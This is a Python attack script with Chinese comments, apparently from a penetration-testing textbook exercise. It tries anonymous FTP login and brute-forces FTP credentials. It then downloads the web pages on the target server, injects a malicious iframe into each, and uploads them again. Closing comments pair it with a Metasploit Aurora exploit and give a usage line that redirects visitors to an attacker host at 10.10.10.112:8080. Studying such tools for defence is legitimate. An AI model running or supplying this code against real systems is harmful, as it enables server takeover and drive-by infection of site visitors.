# coding=UTF-8

"""
网络渗透

k985ytv
ftplib: FTP protocol client
文件传输协议 FTP 服务用户在一个基于 TCP 网络的主机之间传输文件。
通常情况下,用户通过用户名和密码来验证 FTP 服务。然而,一些网站提供匿名认证的能力,在这种情况下,用户提供用户名为“anonymous”,用电子邮件来代替密码。

Metasploit 框架:很容易地获取、开发并对计算机软件漏洞实施攻击。 它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。
"""
import ftplib
import optparse


def anonLogin(hostname):
    """匿名登陆"""
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print('\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded!')
        ftp.quit()
        return True
    except Exception as e:
        print('\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed!')
        return False

# 偷取FTP 证书：FileZilla,经常将密码存储在配置文件中
def bruteLogin(hostname, passwdFile):
    """接受主机名和密码文件作为输入返回允许访问主机的证书。"""
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying: " + userName + "/" + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + userName + "/" + passWord)
            ftp.quit()
            return (userName, passWord)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)

# 在 FTP 服务器上寻找 WEB 页面: 测试服务器是否还提供了 WEB 访问
def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        return
    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print('[+] Found default page: ' + fileName)
        retList.append(fileName)
    return retList


def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print('[+] Downloaded Page: ' + page)
    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + page)
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print('[+] Uploaded Injected Page: ' + page)


def attack(username, password, tgtHost, redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)
    for defPage in defPages:
        injectPage(ftp, defPage, redirect)


def main():
    parser = optparse.OptionParser('usage%prog -H \
        <target host[s]> -r <redirect page> [-f <userpass file>]')
    parser.add_option('-H', dest='tgtHosts', type='string',
        help='specify target host')
    parser.add_option('-f', dest='passwdFile', type='string',
        help='specify user/password file')
    parser.add_option('-r', dest='redirect', type='string',
        help='specify a redirection page')
    (options, args) = parser.parse_args()
    tgtHosts = str(options.tgtHosts).split(', ')
    passwdFile = options.passwdFile
    redirect = options.redirect
    if tgtHosts == None or redirect == None:
        print(parser.usage)
        exit(0)
    for tgtHost in tgtHosts:
        username = None
        password = None
        if anonLogin(tgtHost) == True:
            username = 'anonymous'
            password = 'me@your.com'
            print('[+] Using Anonymous Creds to attack')
            attack(username, password, tgtHost, redirect)
        elif passwdFile != None:
            (username, password) = bruteLogin(tgtHost,passwdFile)
        if password != None:
            print('[+] Using Creds: ' + username + '/' +password + ' to attack')
            attack(username, password, tgtHost, redirect)


if __name__ == '__main__':
    main()

# 添加恶意注入脚本到 WEB 页面
# msf exploit(ms10_002_aurora) > [*] Sending Internet Explorer "Aurora"

# 添加一个重定向从被感染的主机到我们的恶意的服务器:注入一个 iframe
# attacker# python massCompromise.py -H 192.168.95.179 -r '<iframe src="http://10.10.10.112:8080/exploit"></iframe>' -f userpass.txt
